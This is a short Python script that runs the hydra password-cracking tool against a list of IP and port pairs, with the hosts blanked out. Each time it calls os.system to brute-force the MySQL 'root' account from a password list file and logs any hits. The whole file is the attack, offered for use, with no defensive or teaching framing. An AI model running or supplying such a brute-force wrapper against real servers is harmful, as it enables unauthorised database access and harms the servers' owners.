import os

li=['xx.xx.xx.xx,xxx','xx.xx.xx.xx,xxx']

for ii in li:
    i=ii.split(',')
    ip=i[0]
    port=str(i[1])
    k='hydra '+ip+' -s '+port+' -l root -P pa  -o mysqlresult -vV mysql'
    print k
    os.system(k)
